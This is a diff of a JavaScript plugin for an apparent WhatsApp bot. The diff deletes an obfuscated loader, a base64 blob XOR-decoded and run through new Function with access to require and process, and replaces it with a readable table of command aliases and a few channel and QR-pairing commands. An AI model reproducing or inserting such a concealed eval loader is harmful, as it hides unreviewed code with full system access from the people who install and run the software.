@@ -1,9 +1,84 @@
 'use strict';
-(function(){
-  const K=Buffer.from('REVDQU5YTUQtMjAyNg==','base64');
-  const D='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';
-  const X=Buffer.from(D,'base64');
-  for(let i=0;i<X.length;i++) X[i]^=K[i%K.length];
-  const C=X.toString('utf8');
-  return (new Function('require','module','exports','__filename','__dirname','process','Buffer',C))(require,module,exports,__filename,__dirname,process,Buffer);
-})();
+/**
+ * Extra names for existing commands. Every alias below points at a command that really does that job
+ * (for example .groupopen → .open, .tiktokdl → .tiktok). Names that are already taken are skipped, so this
+ * file can never break loading. Loaded last (zz- prefix) so all targets exist.
+ *
+ * Also here: a few small commands that were missing — channel unfollow/mute/stats and a QR-pairing pointer.
+ */
+const U = require('../lib/util');
+const { UserError } = U;
+
+/** target command -> extra names */
+const ALIASES = {
+  // owner & sudo
+  broadcast: ['bc'], setsudo: ['addowner', 'addsudo', 'setowner'], delsudo: ['delowner'], getsudo: ['ownerlist', 'sudolist'],
+  backup: ['exportdb', 'backupsession', 'sessionbackup'], restore: ['importdb', 'restoredb', 'sessionrestore'],
+  // group
+  ginfo: ['group', 'groupall'], invite: ['glink', 'ginvite', 'groupinvitecode'], tagall: ['tagmembers'], close: ['lock', 'groupclose'], open: ['unlock', 'groupopen'],
+  gpp: ['setgpp', 'groupicon'], approve: ['accept', 'groupapprove'], reject: ['groupreject'], rules: ['grouprules'], welcome: ['setwelcome'], goodbye: ['setgoodbye'],
+  mute: ['groupmute'], unmute: ['groupunmute'], warn: ['groupwarn'], reset: ['groupreset'], setdesc: ['groupdesc'], admins: ['groupadmins', 'leaders'], members: ['groupmembers'],
+  msgs: ['groupactivity'], modlog: ['groupaudit'], hidetag: ['announce'], promote: ['mod'], demote: ['unmod'], left: ['leavegroup'],
+  // music & downloads
+  yta: ['audio'], lyrics: ['lyric'], song: ['downloadsong'], video: ['yt', 'youtube', 'youtubedl'], tiktok: ['tiktokdl', 'tiktokvideo'], insta: ['reels', 'instadl', 'instagramdl'],
+  fb: ['fbdown', 'facebookdl', 'facebookstory'], twitter: ['x', 'twitterdl', 'twittervideo'], pinterest: ['pinterestdl', 'pinterestvideo'], story: ['instagramstory'], reddit: ['redditsave'],
+  videothumbnail: ['screenshotvideo'], short: ['shorturl'], expandurl: ['unshorturl'], apk: ['downloadapk'], doc: ['document'],
+  filecheck: ['fileinfo', 'filetype', 'filemime', 'filemetadata'], hashcheck: ['filehash'], ss: ['downloadstatus', 'statusdl', 'statusdownload', 'statussave', 'savestatus'],
+  yts: ['youtube-search'], img: ['image-search'], enhance: ['restorephoto'],
+  // utilities & status
+  remind: ['remindme', 'alarmset', 'alarm'], note: ['notepad'], quote: ['randomquote'], fancy: ['fancytext'],
+  autoreactstatus: ['statusreact', 'statusreaction', 'autolike'], privacy: ['statusprivacy'], autoviewstatus: ['readstatus', 'autoview', 'autostatus'],
+  vv: ['readvo', 'viewonce', 'reveal', 'recover', 'savevo', 'getvo', 'voimage', 'vovideo', 'voaudio', 'voextract', 'vosave', 'vodownload', 'vopreview'],
+  vv2: ['readvo2', 'viewonce2', 'reveal2', 'recover2', 'savevo2', 'getvo2', 'voprivate', 'vome'],
+  // channel
+  channel: ['channelinfo', 'channelinvite', 'channelview', 'channelshare', 'channelpreview'], creact: ['channelreact', 'channelreaction'], postupdate: ['channelupdate'], forwardmode: ['channelforward'],
+  // stickers
+  take: ['rename'], emix: ['emojimix'], sticker: ['stickermaker'], gifconvert: ['gif', 'gifmaker'], videocaption: ['gifcaption'], reverse: ['gifreverse'], react: ['reaction'],
+  photo: ['stickerconvert', 'stickerextract', 'stickerdownload'], url: ['stickerupload'],
+  // config
+  allvar: ['getconfig'], setvar: ['setconfig'], resetsettings: ['resetconfig'], language: ['lang', 'setlanguage'], autoreadmessages: ['autoread', 'setread'], autoreact: ['setreaction'],
+  filter: ['autoreply', 'setautoreply', 'addfilter', 'setfilter'], stop: ['delautoreply', 'delfilter'], filters: ['listautoreply'], antidelete: ['setantidelete'], antiviewonce: ['setantiviewonce'],
+  antilink: ['setantilink'], antispam: ['setantispam', 'setantiflood'], setgreet: ['autogreet'], typing: ['settyping'], recording: ['setrecording'],
+  // stats & pairing
+  stats: ['botstats'], memoryusage: ['ram'], queue: ['queueinfo'], jobs: ['jobstatus'], connection: ['session'], owner: ['ownerinfo'], ping: ['latency', 'response'], errors: ['errorlogs'],
+  pair: ['connect', 'paircode', 'pairingcode', 'botpair', 'devicepair', 'devicecode', 'link', 'linkdevice', 'adddevice', 'deviceadd', 'relink'],
+  logout: ['disconnect', 'botlogout', 'botdisconnect', 'unlink', 'unlinkdevice', 'devicedisconnect', 'sessiondelete'],
+  reconnect: ['botreconnect', 'botconnect', 'deviceconnect', 'reauth', 'refreshsession'], restart: ['botrestart'], sessions: ['botlist', 'sessionlist']
+};
+
+module.exports = ({ def: rawDef, alias, registry }) => {
+  let added = 0;
+  for (const [target, names] of Object.entries(ALIASES)) {
+    if (!registry.has(target)) continue;
+    const fresh = names.filter(n => !registry.has(n.toLowerCase()));
+    if (fresh.length) { alias(target, ...fresh); added += fresh.length; }
+  }
+  const def = (names, opts, run) => { const n = [].concat(names).filter(x => !registry.has(x.toLowerCase())); if (n.length) rawDef(n, opts, run); };
+  const P = ctx => ctx.var('PREFIX');
+
+  /* ------------------------------- channel: unfollow / mute / stats ------------------------------- */
+  const channel = async ctx => { const i = await ctx.channelInfo?.(); if (!i?.jid) throw new UserError('I could not find your channel. Set CHANNEL_URL (or use .setchannel) first.'); return i; };
+  def('unfollowchannel', { cat: 'community', owner: true, desc: 'Unfollow the bot\'s configured channel with this account.' }, async ctx => {
+    const i = await channel(ctx); if (typeof ctx.sock.newsletterUnfollow !== 'function') throw new UserError('This WhatsApp library version cannot unfollow channels.');
+    await ctx.sock.newsletterUnfollow(i.jid); await ctx.reply(`✅ Unfollowed *${i.name}*.`);
+  });
+  for (const [name, fn, word] of [['channelmute', 'newsletterMute', 'muted'], ['channelunmute', 'newsletterUnmute', 'unmuted']]) {
+    def(name, { cat: 'community', owner: true, desc: `Mute or unmute the bot's channel notifications for this account.` }, async ctx => {
+      const i = await channel(ctx); if (typeof ctx.sock[fn] !== 'function') throw new UserError('This WhatsApp library version cannot change channel notifications.');
+      await ctx.sock[fn](i.jid); await ctx.reply(`🔔 *${i.name}* is now ${word}.`);
+    });
+  }
+  def(['channelstats', 'channelfollowers', 'channelmembers'], { cat: 'community', desc: 'Followers and details of the bot\'s channel.' }, async ctx => {
+    const i = await channel(ctx); const m = await ctx.sock.newsletterMetadata('jid', i.jid).catch(() => null); if (!m) throw new UserError('WhatsApp did not return the channel details right now.');
+    const subs = m.subscribers ?? m.thread_metadata?.subscribers_count; const name = m.name || m.thread_metadata?.name?.text || i.name;
+    await ctx.reply(`📢 *${name}*\n👥 Followers: *${subs != null ? Number(subs).toLocaleString('en-US') : 'unknown'}*\n${m.verification || m.thread_metadata?.verification ? '✅ Verified\n' : ''}🔗 ${process.env.CHANNEL_URL || ''}`.trim(), { title: 'Channel' });
+  });
+
+  /* --------------------------------------- pairing by QR --------------------------------------- */
+  def(['getqr', 'refreshqr', 'pairingqr', 'botqr', 'deviceqr'], { cat: 'bot', owner: true, desc: 'How to link a number with a QR code.' }, ctx =>
+    ctx.reply(`📷 QR pairing is shown on the bot's web page (the pairing page of your dashboard). Open it, choose *QR code*, then scan it from WhatsApp → Linked devices.\n\nPrefer a code? Send *${P(ctx)}pair <number with country code>* and enter the 8-letter code in WhatsApp → Linked devices → Link with phone number.`, { title: 'Link with QR' }));
+
+  void added;
+};
+
+module.exports.ALIASES = ALIASES;
